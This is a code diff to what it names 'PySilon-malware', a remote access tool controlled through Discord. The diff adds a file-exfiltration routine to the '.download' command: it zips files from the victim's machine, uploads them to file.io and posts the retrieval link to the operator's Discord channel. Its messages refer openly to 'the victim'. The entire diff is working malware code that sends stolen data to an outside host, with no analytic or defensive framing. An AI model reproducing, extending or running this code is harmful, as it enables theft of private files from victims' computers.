@@ -40,4 +40,26 @@ elif message.content.startswith('.download'):
                     upload_file = zip_path
                     is_zipped = True
 
-                await message.channel.send("```Uploading to file.io... This can take a while depending on the file size, amount and the victim's internet speed..
+                await message.channel.send("```Uploading to file.io... This can take a while depending on the file size, amount and the victim's internet speed..```")
+
+                def upload_to_fileio(path_to_upload):
+                    with open(path_to_upload, 'rb') as f:
+                        response = requests.post('https://file.io/', files={'file': f})
+                    return response.json()
+
+                loop = asyncio.get_event_loop()
+                data = await loop.run_in_executor(None, upload_to_fileio, upload_file)
+
+                if is_zipped and os.path.exists(upload_file):
+                    os.remove(upload_file)
+
+                if data.get('success'):
+                    embed = discord.Embed(title=f"🟢 {file_path}", description=f"Click [here](<{data['link']}>) to download.", colour=discord.Colour.green())
+                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
+                    await message.channel.send(embed=embed)
+                    await message.channel.send('Warning: The file will be removed from file.io right after the first download.')
+                else:
+                    embed = discord.Embed(title="📛 Error", description='```Upload to file.io failed.```', colour=discord.Colour.red())
+                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
+                    reaction_msg = await message.channel.send(embed=embed)
+                    await reaction_msg.add_reaction('🔴')
